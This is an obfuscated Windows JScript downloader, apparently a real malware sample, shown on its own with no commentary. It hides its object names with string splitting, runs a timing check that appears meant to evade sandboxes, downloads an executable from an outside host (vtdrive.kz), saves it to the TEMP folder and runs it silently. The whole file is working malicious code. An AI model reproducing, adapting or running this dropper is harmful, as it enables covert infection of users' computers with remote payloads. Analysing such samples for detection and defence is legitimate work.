var P = false;
var GF = "Create"+"Object";
var N = function UN() {return WScript[GF]("WScript"+".Shell");}(), E = 11;
var ME = "MSXML2"+".XMLHTTP";
var MU = 2;
var S0 = MU - 2;
function DG(D){N["Run"](D, S0, S0);};
function X(){return ME + "";};
function A(FA, V0){S0 = S0 * 1; return FA - V0;};
function NB(){return GF;};
/*@cc_on
  @if (@_win32 || @_win64)
    P = true;
  @end
@*/
if (P)
{
var W = "";
function Q(){return 22;};
var D0 = 0; var I = 0;
function S()
{
var G = new this["Date"]();
var V = G["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var G = new this["Date"]();
var A0 = G["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var G = new this["Date"]();
var UE = G["getUTCMilliseconds"]();
var D0 = "H";
D0 = A(A0, V);
var I = "MV";
I = A(UE, A0);
W = "open";
return A(D0, I);
}
var JB = false;
var G0 = false;
for (var X0 = S0; X0 < Q() * 1; X0++){if (S() != S0){
JB = true; 
I = "31" + 11 * D0 + I; 
G0 = true; 
break;
}}
function HI() {return ((JB == true) && (JB == G0)) ? 1 : S0;};
if (JB && HI() && G0){
function Z() {return N["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "sW5OhdDxHBMHJnD.ex" + "e";};
 U0 = X();
 Q0 = WScript[GF](U0);
 var U = 1;
do { 
	for (;U;){
	try {
		if (U == 1)
		{
			Q0[W]("GET", "http://vtdrive.kz/f6dh1a", false);
			Q0["send"]();
			QP = "Sleep";
			U = 2;
		}
		WScript[QP](Q() + 120); 
		if (Q0["readystate"] < 2 * 2) continue;
		U = S0;
		function QV(LT) {var ZW = (1, 2, 3, 4, 5, LT); return ZW;};
		S1 = WScript[NB()]("ADODB.Stream");
		U0 = S1;
		U0[W]();
		U0["type"] = QV(1);
		U0["write"](Q0["ResponseBody"]);
		S1["position"] = QV(S0);
		U0["Save" + "ToFile"](Z(), 2);
		S1["cl"+"ose"]();
		F = Z();
		DG(F);
	} catch(XC){};};
}while (U);
}
}

